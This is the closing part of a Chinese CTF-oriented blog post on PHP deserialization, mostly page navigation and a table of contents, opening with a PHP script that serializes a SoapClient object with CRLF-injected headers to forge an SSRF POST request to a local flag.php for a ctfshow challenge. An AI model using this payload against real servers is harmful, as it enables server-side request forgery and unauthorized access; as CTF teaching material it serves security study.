<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>.<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;ssrf&quot;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">VVkladg0r</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/')">php反序列化</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6640eacae5439.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=php反序列化&amp;url=http://cszvvds.cc/2024/05/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://cszvvds.cc" target="_blank">VV</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/web/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>web<span class="tagsPageCount">7</span></a><a class="post-meta__box__tags" href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>后端漏洞<span class="tagsPageCount">5</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">远程命令执行</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/13/java%E5%9F%BA%E7%A1%80/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java基础</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/05/13/LDAP%E6%B3%A8%E5%85%A5/" title="LDAP注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">LDAP注入</div></div></a></div><div><a href="/2024/05/13/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">SQL注入</div></div></a></div><div><a href="/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">pickle反序列化</div></div></a></div><div><a href="/2024/05/13/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="远程命令执行"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">远程命令执行</div></div></a></div><div><a href="/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/" title="MD5长度拓展攻击"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">MD5长度拓展攻击</div></div></a></div><div><a href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-05-13</div><div class="title">反弹shell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.</span> <span class="toc-text">面向对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">面向过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">面向对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB"><span class="toc-number">1.1.3.</span> <span class="toc-text">类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">继承</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">类的结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">类的修饰符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text">序列化基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#r%E4%B8%8ER"><span class="toc-number">1.2.1.</span> <span class="toc-text">r与R</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.2.</span> <span class="toc-text">对象的序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.4.2.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#construct"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">__construct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">__destruct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">1.4.2.4.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.4.2.5.</span> <span class="toc-text">__toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-number">1.4.2.6.</span> <span class="toc-text">__invoke()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-number">1.4.2.7.</span> <span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#callStatic"><span class="toc-number">1.4.2.8.</span> <span class="toc-text">__callStatic()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get"><span class="toc-number">1.4.2.9.</span> <span class="toc-text">__get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#set"><span class="toc-number">1.4.2.10.</span> <span class="toc-text">__set()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isset"><span class="toc-number">1.4.2.11.</span> <span class="toc-text">__isset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unset"><span class="toc-number">1.4.2.12.</span> <span class="toc-text">__unset()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clone"><span class="toc-number">1.4.2.13.</span> <span class="toc-text">__clone()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP%E9%93%BE"><span class="toc-number">1.5.</span> <span class="toc-text">POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.5.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop%E9%93%BE%E6%9E%84%E9%80%A0%E4%B8%8Epoc%E7%BC%96%E5%86%99"><span class="toc-number">1.5.2.</span> <span class="toc-text">pop链构造与poc编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.6.</span> <span class="toc-text">字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8"><span class="toc-number">1.6.1.</span> <span class="toc-text">减少逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%9E%E5%A4%9A%E9%80%83%E9%80%B8"><span class="toc-number">1.6.2.</span> <span class="toc-text">增多逃逸</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wakeup%E7%BB%95%E8%BF%87"><span class="toc-number">1.7.</span> <span class="toc-text">__wakeup绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">引用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.9.</span> <span class="toc-text">session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">1.9.1.</span> <span class="toc-text">使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-session%E7%90%86%E8%A7%A3"><span class="toc-number">1.9.2.</span> <span class="toc-text">php session理解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">1.9.2.1.</span> <span class="toc-text">定义</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E5%99%A8%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.9.3.</span> <span class="toc-text">处理器与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.9.3.1.</span> <span class="toc-text">利用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.9.3.2.</span> <span class="toc-text">php处理器</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#php%E5%A4%84%E7%90%86%E5%99%A8-1"><span class="toc-number">1.9.3.2.1.</span> <span class="toc-text">php处理器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-binary%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.9.3.2.2.</span> <span class="toc-text">php_binary处理器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-serialize-%E5%A4%84%E7%90%86%E5%99%A8"><span class="toc-number">1.9.3.2.3.</span> <span class="toc-text">php_serialize 处理器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.9.4.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%BB%BA%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.9.4.1.</span> <span class="toc-text">自建环境模拟</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%96%B9%E5%BC%8F%E4%B8%80"><span class="toc-number">1.9.4.2.</span> <span class="toc-text">利用session.upload_progress进行反序列化-方式一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%96%B9%E5%BC%8F%E4%BA%8C"><span class="toc-number">1.9.4.3.</span> <span class="toc-text">利用session.upload_progress进行反序列化-方式二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.10.</span> <span class="toc-text">phar反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="toc-number">1.10.1.</span> <span class="toc-text">phar反序列化基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E6%95%B0%E6%8D%AE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.10.2.</span> <span class="toc-text">脏数据污染</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zip%E6%B7%BB%E5%8A%A0%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">zip添加脏数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tar%E6%B7%BB%E5%8A%A0%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-number">1.10.2.2.</span> <span class="toc-text">tar添加脏数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pahr%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.2.3.</span> <span class="toc-text">pahr文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GC%E5%BC%BA%E5%88%B6%E5%9B%9E%E6%94%B6"><span class="toc-number">1.11.</span> <span class="toc-text">GC强制回收</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.</span> <span class="toc-text">bypass绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup%E7%BB%95%E8%BF%87-1"><span class="toc-number">1.12.1.</span> <span class="toc-text">__wakeup绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.2.</span> <span class="toc-text">__destruct绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.3.</span> <span class="toc-text">正则绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.4.</span> <span class="toc-text">引用绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-number">1.12.5.</span> <span class="toc-text">16进制绕过字符的过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.12.6.</span> <span class="toc-text">phar的绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.13.</span> <span class="toc-text">原生类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">1.13.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%BD%BF%E7%94%A8"><span class="toc-number">1.13.2.</span> <span class="toc-text">常用原生类使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DirectoryIterator"><span class="toc-number">1.13.2.1.</span> <span class="toc-text">DirectoryIterator()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FilesystemIterator"><span class="toc-number">1.13.2.2.</span> <span class="toc-text">FilesystemIterator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GlobIterator"><span class="toc-number">1.13.2.3.</span> <span class="toc-text">GlobIterator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open-basedir"><span class="toc-number">1.13.2.4.</span> <span class="toc-text">绕过open_basedir</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SplFileObject"><span class="toc-number">1.13.2.5.</span> <span class="toc-text">SplFileObject()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ZipArchive"><span class="toc-number">1.13.2.6.</span> <span class="toc-text">ZipArchive()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ReflectionMethod"><span class="toc-number">1.13.2.7.</span> <span class="toc-text">ReflectionMethod</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Error"><span class="toc-number">1.13.2.8.</span> <span class="toc-text">Error</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exception"><span class="toc-number">1.13.2.9.</span> <span class="toc-text">Exception</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95hash"><span class="toc-number">1.13.2.10.</span> <span class="toc-text">绕hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimpleXMLElement"><span class="toc-number">1.13.2.11.</span> <span class="toc-text">SimpleXMLElement</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.13.2.12.</span> <span class="toc-text">SoapClient</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" title="JAVA加载字节码">JAVA加载字节码</a><time datetime="2024-06-07T13:32:59.000Z" title="发表于 2024-06-07 21:32:59">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/" title="java反序列化--CC7">java反序列化--CC7</a><time datetime="2024-06-07T13:21:19.000Z" title="发表于 2024-06-07 21:21:19">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6">java反序列化--CC6</a><time datetime="2024-06-07T13:21:15.000Z" title="发表于 2024-06-07 21:21:15">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a 